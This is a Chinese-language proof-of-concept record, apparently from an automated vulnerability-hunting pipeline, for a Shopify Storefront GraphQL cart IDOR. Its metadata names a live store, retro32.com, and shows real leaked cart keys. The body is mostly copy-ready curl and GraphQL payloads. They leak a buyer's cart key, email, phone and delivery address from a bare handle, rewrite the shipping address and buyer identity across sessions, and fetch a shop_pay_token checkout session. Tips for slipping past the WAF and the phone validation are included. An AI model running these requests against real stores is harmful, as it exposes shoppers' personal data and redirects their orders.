# Shopify Storefront /api/graphql 的 ?key 校验两处不一致：cart(id:) 仅降级视图，但 cartPrepareForCompletion 裸 handle 回显真实 key+收货 PII 并可跨会话改写购物车（retro32.com 推翻原 low 天花板）

- **code**: shopify-storefront-cart-idor
- **kind**: poc
- **category**: unauthorized
- **component**: Shopify Storefront GraphQL（/api/graphql：cart(id:) / cartPrepareForCompletion / cartDeliveryAddressesUpdate / cartBuyerIdentityUpdate / cartNoteUpdate）
- **severity**: high
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: task#12 / finding_id=189（finding_checks.verdict=verified，findings.status=confirmed），2026-11-12 11:09–11:13 UTC 于 www.retro32.com 实测（python3 requests + curl；全程零 Cookie / 零 Authorization / 零 key）：

① 全新无 Cookie 会话 POST /api/graphql，cartPrepareForCompletion(cartId="gid://shopify/Cart/hWNJ3kMLOcplHTkFwYnNTDSa" 裸 handle) → 200 CartStatusNotReady，cart.id 回显真实 "?key=046555d1c9a601b1be1b694b618a59b0"，buyerIdentity={victim.marker.3843@example.com,+447911123456,GB}，delivery.addresses=[Alice Victim/12 Rose Lane/Flat 3/London/SW1A 1AA/GB/+447911123456]；另一车同法回显 "?key=0dc65703107f56ea89a78e1a5075d8e2" + 完整 PII。
② 判据：cartId 带错误 key=deadbeefdeadbeefdeadbeefdeadbeef 的响应正文与裸 handle / 正确 key 逐字节相同（md5 f69e6c7bdc59425a513a291532d843f4）；随机 handle → {"result":null}。
③ 用泄露 key 写入：cartDeliveryAddressesUpdate → userErrors=[]，地址改写为 Verifier PWN3843/666 Redirect Lane/Manchester/M1 1AA；cartBuyerIdentityUpdate → attacker.marker.3843@example.com（userErrors=[]）；cartNoteUpdate → pwned-3843-via-bare-handle。
④ 再开全新无 Cookie 会话、仅用裸 handle 调 prepare，回显上述改写值 → 跨会话持久生效。
⑤ GET https://www.retro32.com/cart/c/<handle>（无 key、无 Cookie）→ 302 到 shop.app/checkout/104201191771/...&shop_pay_token=eyJhbGciOiJIUzI1NiJ9...，并下发 _shopify_essential/analytics/marketing cookie。
原始请求/响应落盘 /opt/artex/data/tasks/12/i3843/（prep_bare.resp / prep_wrongkey.resp / prep_rand.resp / write_addr.resp / write_bi.resp / write_note.resp / verify_bare_after_write.resp / prep2_bare.resp / cartc_headers.txt）。
- **path**: pocs/shopify-storefront-cart-idor/poc.md
- **tags**: shopify,storefront,graphql,unauthorized,idor,cart,key,prepare-for-completion,pii,delivery-address,checkout,bare-handle
- **created_at**: 2026-11-11T14:49:15.909Z
- **engine**: https://www.retro32.com/api/graphql
- **found_by**: exploit

## 描述

Shopify 托管店 POST /api/graphql（Storefront GraphQL，匿名可达）的 cartPrepareForCompletion 完全不校验 cart id 中的 ?key：仅传 25 位裸 handle 就在 cart.id 里逐字回显真实 ?key=<32hex>，并回显 buyerIdentity.email/phone、收货地址全字段（姓名/街道/城市/邮编/国家/电话）、note 与 attributes；用回显 key 可跨会话 cartDeliveryAddressesUpdate / cartBuyerIdentityUpdate / cartNoteUpdate 持久改写他人购物车，GET /cart/c/&lt;handle&gt; 还能无 key 获得该车结账会话（shop_pay_token）。重要纠偏：同一店 cart(id:) 查询只返回降级视图（email 恒为 null、无 key），所以「本店 PII 受 key 门禁、最高 low」的旧结论只对 cart(id:) 成立，对 cartPrepareForCompletion 不成立。handle 为 108bit 高熵不可枚举，必须有泄漏源（分享的 /cart/c/ 链接、Referer、日志、同设备 cart cookie），故定 high 而非 critical。

## 用法

```
前置：Shopify 托管店 Storefront API 匿名可达（POST /api/graphql 返回 {"data":...} 而非 401/403/HTML）；已知目标 cart 的 25 位 base62 handle（来源：分享的 /cart/c/&lt;handle&gt; 链接、Referer、服务端日志、同设备未 HttpOnly 的 cart cookie、ShopifyAnalytics.meta.cart.id）。零 Cookie / 零 Authorization / 零 key。

# 0) 取一个真实商品变体 id
curl -sk 'https://&lt;shop&gt;/products.json?limit=1' | jq -r '.products[0].variants[0].id'

# 1) 探活 + 确认 mutation 存在（匿名 introspection，很多店可直出）
curl -sk 'https://&lt;shop&gt;/api/graphql' -H 'Content-Type: application/json' \
  --data '{"query":"{__type(name:\"Mutation\"){fields{name}}}"}'
# => 字段清单里应有 cartPrepareForCompletion

# 2) 自建对照车（受害侧基线，写入 email/phone/地址/note），拿 handle
curl -sk 'https://&lt;shop&gt;/api/graphql' -H 'Content-Type: application/json' --data '{"query":"mutation Create($input:CartInput!){cartCreate(input:$input){cart{id} userErrors{message}}}","variables":{"input":{"lines":[{"merchandiseId":"gid://shopify/ProductVariant/&lt;VARIANT_ID&gt;","quantity":1}],"buyerIdentity":{"email":"victim@example.com","phone":"+447911123456","countryCode":"GB"},"note":"victim-note"}}}'
# => cart.id = gid://shopify/Cart/&lt;HANDLE&gt;?key=&lt;REAL_KEY&gt;

# 3) 核心：全新无 Cookie 会话，cartId 去掉 ?key，只给裸 handle
curl -sk 'https://&lt;shop&gt;/api/graphql' -H 'Content-Type: application/json' --data '{"query":"mutation P($cartId:ID!){cartPrepareForCompletion(cartId:$cartId){result{__typename ... on CartStatusReady{cart{id note buyerIdentity{email phone countryCode} delivery{addresses{id selected address{... on CartDeliveryAddress{firstName lastName address1 city zip countryCode phone}}}}}} ... on CartStatusNotReady{cart{id note buyerIdentity{email phone countryCode} delivery{addresses{id selected address{... on CartDeliveryAddress{firstName lastName address1 city zip countryCode phone}}}}} errors{code message}}} userErrors{field message code}}}","variables":{"cartId":"gid://shopify/Cart/&lt;HANDLE&gt;"}}'
# => 200 CartStatusReady/NotReady，cart.id 回显真实 "?key=&lt;REAL_KEY&gt;" + 买家 email/phone + 全量收货地址

# 4) 判据对照（决定性）
#    a. cartId 带 "?key=deadbeefdeadbeefdeadbeefdeadbeef" 的响应正文应与第 3 步逐字节相同（md5 相等）
#    b. 随机 25 位 handle => {"data":{"cartPrepareForCompletion":{"result":null}}}（证明是按 id 命中，非兜底）

# 5) 用泄露的 key 写入（跨会话生效）
#    5.1 改收货地址：address id 取第 3 步 delivery.addresses[].id（gid://shopify/CartSelectableAddress/...）
curl -sk 'https://&lt;shop&gt;/api/graphql' -H 'Content-Type: application/json' --data '{"query":"mutation U($cartId:ID!,$addresses:[CartSelectableAddressUpdateInput!]!){cartDeliveryAddressesUpdate(cartId:$cartId,addresses:$addresses){cart{delivery{addresses{id selected address{... on CartDeliveryAddress{firstName lastName address1 city zip countryCode phone}}}}} userErrors{field message code}}}","variables":{"cartId":"gid://shopify/Cart/&lt;HANDLE&gt;?key=&lt;REAL_KEY&gt;","addresses":[{"id":"&lt;CartSelectableAddress_ID&gt;","address":{"deliveryAddress":{"firstName":"Verifier","lastName":"PWN","address1":"666 Redirect Lane","city":"Manchester","provinceCode":"ENG","zip":"M1 1AA","countryCode":"GB","phone":"+447911123456"}},"selected":true}]}}'
#    5.2 改买家身份：cartBuyerIdentityUpdate(cartId:..., buyerIdentity:{email:"attacker@example.com", phone:"...", countryCode:"GB"})
#    5.3 改备注：cartNoteUpdate(cartId:..., note:"pwned")
#    => 三者均应 userErrors=[]

# 6) 跨会话复核：再开全新无 Cookie 会话，仍只用裸 handle 调第 3 步 mutation
#    => note/email/address 均为第 5 步写入值（持久生效，非缓存）

# 7) handle → 结账会话（无需 key、无需 Cookie）
curl -sk -i 'https://&lt;shop&gt;/cart/c/&lt;HANDLE&gt;'
# => 302 Location=https://shop.app/checkout/...&shop_pay_token=eyJ... + Set-Cookie _shopify_essential/analytics/marketing

判据：第 3 步回显真实 ?key + email/phone + 地址全字段；第 4a 步错 key 与正确 key 响应 md5 完全相同（若校验 key 应为 null/错误）；第 4b 步随机 handle 为 null；第 5 步 userErrors=[] 且第 6 步跨会话可见。
失败常见原因：/api/graphql 返回 401/403 或 HTML（Storefront token 未公开/被关）；GID 前缀必须 gid://shopify/Cart/；handle 必须是 25 位 base62；必须 POST + Content-Type: application/json（GET 不行）；phone 受 libphonenumber 校验，+447700900xxx 等戏剧号段判 invalid，用 +447911123456 一类真实号段；地址改写必须带第 3 步拿到的 CartSelectableAddress id 且 selected:true；WAF 限速时单线程、请求间隔 ≥3s。
```

## 正文

```
# Shopify Storefront /api/graphql ?key 校验不一致 → 裸 handle 读 PII / 写购物车

## 结论
`POST https://<shop>/api/graphql`（Shopify Storefront GraphQL，匿名可达）上存在两条不一致的访问控制路径：

| 入口 | ?key 是否校验 | 能拿到什么 |
|---|---|---|
| `cart(id: "gid://shopify/Cart/<handle>")` 查询 | 不校验，但**降级视图** | totalQuantity/cost/lines/countryCode/createdAt；`buyerIdentity.email` 恒为 `null`，无 checkoutUrl token |
| `cartPrepareForCompletion(cartId: "gid://shopify/Cart/<handle>")` mutation | **完全不校验** | `cart.id` 逐字回显真实 `?key=<32hex>`、`buyerIdentity.email/phone`、`delivery.addresses` 全字段、`note`、`attributes` |

拿到回显的 key 之后，可跨会话执行 `cartDeliveryAddressesUpdate`（收货改道）、`cartBuyerIdentityUpdate`（换买家邮箱/电话）、`cartNoteUpdate`（改备注），全部 `userErrors=[]` 并持久生效。`GET /cart/c/<handle>`（不带 key、不带 Cookie）还会 302 到 shop.app 结账并下发该车的 `shop_pay_token`。

**纠偏**：本店早期的结论「裸 handle 只能读购物车内容，email/PII 仍受 key 门禁，最高 low」只对 `cart(id:)` 成立；换成 `cartPrepareForCompletion` 后 key 校验整体缺失，可直接拿到 key + 全量 PII + 写权限，定级 high。

## 前提
1. 目标为 Shopify 托管店，Storefront API 匿名可达（`POST /api/graphql` 返回 `{"data":...}`）。
2. 已知目标购物车的 25 位 handle。handle 为 108bit 随机、不可枚举，必须有泄漏源：分享的 `/cart/c/<handle>` 链接、Referer、服务端日志、同设备未 HttpOnly 的 cart cookie、`ShopifyAnalytics.meta.cart.id`。
3. 无需账号、Cookie、key、Storefront token。

## 复现步骤

### 0. 取变体 id 与确认 mutation 存在
```http
GET /products.json?limit=1        -> products[0].variants[0].id
```
```http
POST /api/graphql
Content-Type: application/json

{"query":"{__type(name:\"Mutation\"){fields{name}}}"}
```
→ 200，字段清单包含 `cartPrepareForCompletion`（说明该店 Storefront schema 开放该 mutation）。

### 1. 自建对照车（受害侧基线）
```http
POST /api/graphql
Content-Type: application/json

{"query":"mutation Create($input:CartInput!){cartCreate(input:$input){cart{id} userErrors{message}}}",
 "variables":{"input":{
   "lines":[{"merchandiseId":"gid://shopify/ProductVariant/<VARIANT_ID>","quantity":1}],
   "buyerIdentity":{"email":"victim@example.com","phone":"+447911123456","countryCode":"GB"},
   "note":"victim-note"}}}
```
→ `cart.id = "gid://shopify/Cart/<HANDLE>?key=<REAL_KEY>"`（正常业务访问必须带 key，这就是对照基线）。

### 2. 核心：裸 handle 调 prepare，一次拿 key + PII
```http
POST /api/graphql          （全新无 Cookie 会话）
Content-Type: application/json

{"query":"mutation P($cartId:ID!){cartPrepareForCompletion(cartId:$cartId){result{__typename ... on CartStatusReady{cart{id note buyerIdentity{email phone countryCode} delivery{addresses{id selected address{... on CartDeliveryAddress{firstName lastName address1 city zip countryCode phone}}}}}} ... on CartStatusNotReady{cart{id note buyerIdentity{email phone countryCode} delivery{addresses{id selected address{... on CartDeliveryAddress{firstName lastName address1 city zip countryCode phone}}}}} errors{code message}}} userErrors{field message code}}}",
 "variables":{"cartId":"gid://shopify/Cart/<HANDLE>"}}
```
→ 200 `CartStatusReady` 或 `CartStatusNotReady`，其中：
```json
{"cart":{"id":"gid://shopify/Cart/<HANDLE>?key=<REAL_KEY>",
         "note":"victim-note",
         "buyerIdentity":{"email":"victim@example.com","phone":"+447911123456","countryCode":"GB"},
         "delivery":{"addresses":[{"id":"gid://shopify/CartSelectableAddress/<UUID>",
                                   "selected":true,
                                   "address":{"firstName":"Alice","lastName":"Victim",
                                              "address1":"12 Rose Lane","city":"London",
                                              "zip":"SW1A 1AA","countryCode":"GB",
                                              "phone":"+447911123456"}}]}}}
```

### 3. 决定性对照
```http
# a) 带错误 key —— 若 key 被校验应报错/返回 null
{"query":"mutation P($cartId:ID!){cartPrepareForCompletion(cartId:$cartId){result{__typename ... on CartStatusNotReady{cart{id}} errors{code}}}}",
 "variables":{"cartId":"gid://shopify/Cart/<HANDLE>?key=deadbeefdeadbeefdeadbeefdeadbeef"}}
→ 与第 2 步（裸 handle）和第 2 步换成正确 key 的响应正文逐字节相同（md5 相等）

# b) 随机 handle 阴性对照
{"variables":{"cartId":"gid://shopify/Cart/AAAAAAAAAAAAAAAAAAAAAAAAA"}}
→ {"data":{"cartPrepareForCompletion":{"result":null}}}
```
md5 相等 = key 校验在 prepare 读路径**完全缺失**，不是缓存或巧合。

### 4. 用泄露的 key 写入（跨会话）
```http
POST /api/graphql
Content-Type: application/json

{"query":"mutation U($cartId:ID!,$addresses:[CartSelectableAddressUpdateInput!]!){cartDeliveryAddressesUpdate(cartId:$cartId,addresses:$addresses){cart{delivery{addresses{id selected address{... on CartDeliveryAddress{firstName lastName address1 city zip countryCode phone}}}}} userErrors{field message code}}}",
 "variables":{"cartId":"gid://shopify/Cart/<HANDLE>?key=<REAL_KEY>",
              "addresses":[{"id":"<CartSelectableAddress_ID>",
                            "address":{"deliveryAddress":{
                              "firstName":"Verifier","lastName":"PWN",
                              "address1":"666 Redirect Lane","city":"Manchester",
                              "provinceCode":"ENG","zip":"M1 1AA",
                              "countryCode":"GB","phone":"+447911123456"}},
                            "selected":true}]}}
```
→ 200 `userErrors=[]`，地址被改写。

同法：
```
cartBuyerIdentityUpdate(cartId:"...?key=<REAL_KEY>", buyerIdentity:{email:"attacker@example.com", phone:"+447911123456", countryCode:"GB"})  -> userErrors=[]
cartNoteUpdate(cartId:"...?key=<REAL_KEY>", note:"pwned")                                                                                  -> userErrors=[]
```

### 5. 跨会话复核（证明持久）
再开**全新无 Cookie** 会话，仍只用裸 handle 调第 2 步 mutation →
`note`/`buyerIdentity.email`/`address` 全部为第 4 步写入值。

### 6. handle → 结账会话
```http
GET https://<shop>/cart/c/<HANDLE>        （无 key、无 Cookie）
```
→ `302 Location: https://shop.app/checkout/<...>/shoppay?...&shop_pay_token=eyJhbGciOiJIUzI1NiJ9...`，同时 `Set-Cookie: _shopify_essential=...; _shopify_analytics=...`。

## 判据
1. 第 2 步 `cart.id` 中出现真实 `?key=<32hex>`，且 email/phone/地址字段非空 —— 单条即成立。
2. 第 3a 步错误 key 与正确 key 的响应正文 md5 完全相同（决定性：若校验应为 null/错误）。
3. 第 3b 步随机 handle 返回 `result:null`（排除"对任何输入兜底"）。
4. 第 4 步 `userErrors=[]` + 第 5 步跨会话可见（证明写权限真实存在）。

## 失败常见原因
- `/api/graphql` 返回 401/403 或 HTML 页面：该店 Storefront token 未公开或被关闭（换 `/web/api/graphql.json`、`/api/{version}/graphql.json` 入口族试）。
- `cartId` 必须是 `gid://shopify/Cart/` 前缀 + 25 位 base62 handle；写成裸 25 位或 `/cart/<id>` 数字 id 都不行。
- 必须 `POST` + `Content-Type: application/json`；GET 不适用于 `/api/graphql`。
- phone 走 libphonenumber 校验：`+447700900xxx` 戏剧号段会被判 invalid，用 `+447911123456` 一类真实号段。
- 地址改写必须带第 2 步返回的 `CartSelectableAddress` id 且 `selected:true`，自己拼 id 会报 not found。
- 触发 WAF 时单线程、请求间隔 ≥3s。

## 边界与定级
- handle 108bit 随机，不可枚举；必须有泄漏源，因此影响面为"已泄漏 handle 的购物车"，定 high 而非 critical。
- 影响链：读 PII（姓名/地址/邮箱/电话/备注）→ 改收货地址（货改道）→ 改买家身份 → 拿到 shop_pay_token 进入该车结账会话。
- `cart(id:)` 读路径是降级视图（email 恒 null），不要把它当作"本店已修好"的证据；两个入口要分开测。

```
